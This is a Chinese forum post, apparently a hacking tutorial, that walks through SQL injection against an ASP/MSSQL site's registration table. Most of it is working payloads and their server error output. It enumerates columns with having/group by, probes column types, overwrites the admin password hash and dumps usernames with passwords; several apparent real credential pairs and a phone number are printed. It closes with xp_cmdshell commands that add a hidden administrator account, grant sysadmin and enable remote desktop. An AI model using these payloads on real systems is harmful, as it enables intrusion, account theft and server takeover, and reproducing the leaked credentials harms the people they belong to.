@@ -1,0 +1,269 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+SQL构造having语句暴字段
+D8888D主贴内容-------------------------------------------------------
+一、获得建立用户的表的名字和字段的名字；使用select语法的having子句。
+**********************************************************************************
+''having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_id'' 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。
+/football/reguser/check.asp，行26
+成果：知道了表的名字reguser和第一个字段的名字reguser.reg_id。
+
+二、通过字段放到group by子句找到字段名。
+1、
+**********************************************************************************
+''group by reguser.reg_id having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_name'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_name字段
+2、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_password'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_password字段
+3、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_relname'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_relname字段
+4、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_regtime'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_regtime字段
+5、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_findme'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_findme字段
+6、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_city'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_city字段
+7、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_qq'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_qq字段
+8、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_icq'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_icq字段
+
+9、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_msn'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_msn字段
+10、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_phone'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_phone字段
+11、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_class'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_class字段
+12、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_money'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_money字段
+13、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_regip'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_regip字段
+14、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_Estar'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_Estar字段
+15、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_Eend'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_Eend字段
+16、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_changeuser'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_changeuser字段
+17、
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_changetime'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_changetime字段
+18
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser,reguser.reg_changetime having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_logintime'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_logintime字段
+19
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser,reguser.reg_changetime,reguser.reg_logintime having 1=1--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+列 ''reguser.reg_online'' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+/football/reguser/check.asp，行26
+成果：得到了reguser.reg_online字段
+20
+**********************************************************************************
+''group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser,reguser.reg_changetime,reguser.reg_logintime,reguser.reg_online having 1=1--
+**********************************************************************************
+返回结果：
+出现信息提示框；你还不是会员请注册
+到这里一个表猜完。
+三、确定列的类型。通过使用类型转化来实现：利用了SQLSERVER在确定两个结果集的字段是否相等前应用sum子句。
+1、
+**********************************************************************************
+''union select sum(reguser.reg_name) from reguser--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e07''
+sum or average aggregate 运算不能以 varchar 数据类型作为参数。
+/football/reguser/check.asp，行26
+成果：reguser.reg_name字段是数据类型varchar。
+2、
+**********************************************************************************
+''union select sum(reguser.reg_id) from reguser--
+**********************************************************************************
+返回结果：
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e14''
+包含 UNION 运算符的 SQL 语句中的所有查询都必须在目标列表中具有相同数目的表达式。
+/football/reguser/check.asp，行26
+四、insert查询：
+**********************************************************************************
+'';insert into reguser values(666,''attacker'',''foobar'')--
+**********************************************************************************
+五、
+''union select * from reguser where reguser.reg_name=''admin''--
+'';select * from reguser where reguser.reg_name=''admin''--
+
+'';updata reguser set reguser.reg_password=''36d201fb337dc23bde4d143491cfae4d'' where reguser.reg_name=''admin''--
+''union updata reguser set reguser.reg_password=''36d201fb337dc23bde4d143491cfae4d'' where reguser.reg_name=''admin''--
+
+六、从reguser表中读取用户名：
+''union select min(reguser.reg_name),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from reguser where reguser.reg_name>''a''--
+这句选择users表中username大于''a''中的最小值，并试图把它转化成一个整型数字：
+
+收集密码：
+''union select reguser.reg_password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from reguser where reguser.reg_name>''admin''--
+''union select password,1,1,1 from users where username=''admin''--
+
+13535701998
+
+创建了一个foo表，里面只有一个单独的列''ret''，里面存放着得到的用户名和密码的字符串
+'';begin declare @ret varchar(8000) set @ret='':'' select @ret=@ret+'' ''+reguser.reg_name+''/''+reguser.reg_password from reguser where reguser.reg_name>@ret select @ret as 1866574 into 1866574 end--
+
+''union select ret,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from foo--
+
+Microsoft OLE DB Provider for SQL Server 错误 ''80040e07''
+将 varchar 值 '': 383838/989898 123456/234567 korea007/154085 风681168/13535701998 kyo327/woaini denglong/247986965'' 转换为数据类型为 int 的列时发生语法错误。
+/football/reguser/check.asp，行26
+
+'';drop table foo--
+
+admin'';declare @o int,@ret int exec sp_oacreate ''speech.voicetext'',@o out exec sp_oamethod @o,''register'',NULL,''foo'',''bar'' exec sp_oasetproperty @o,''speed'',150 exec sp_oamethod @o,''speak'',NULL,''all your sequel servers are belong to us'',528 waitfor delay ''00:00:05''--
+
+=-= 加帐号 =-=
+'';Exec master..xp_cmdshell ''net user''--
+
+'';Exec master..xp_cmdshell ''net user jiaoniang$ 1866574 /add''--
+'';Exec master..xp_cmdshell ''net localGroup Administrators jiaoniang$ /add''--
+
+'';exec master..sp_addlogin jiaoniang$,1866574--
+'';exec master..sp_addsrvrolemember jiaoniang$,sysadmin--
+
+'';exec xp_regread HKEY_LOCAL_MACHINE,''SYSTEM\CurrentControlSet\Services\lanmanserver\parameters'',''nullsessionshares''--
+
+=-= 开服务 =-=
+'';Exec master..xp_cmdshell ''net stat telnet''--
+'';Exec master..xp_cmdshell ''net stat server''--
+
+=-= 开3389 =-=
+'';Exec master..xp_cmdshell "echo [Components] > c:\1866574"--
+//在c盘根目录建写入一个文件
+'';Exec master..xp_cmdshell "echo TsEnable = on >> c:\1866574"--
+//追加写入
+'';Exec master..xp_cmdshell "sysocmgr /i:c:\windows\inf\sysoc.inf /u:c:\1866574 /q"--
+//开3389，成功的话过会肉机会重启！！
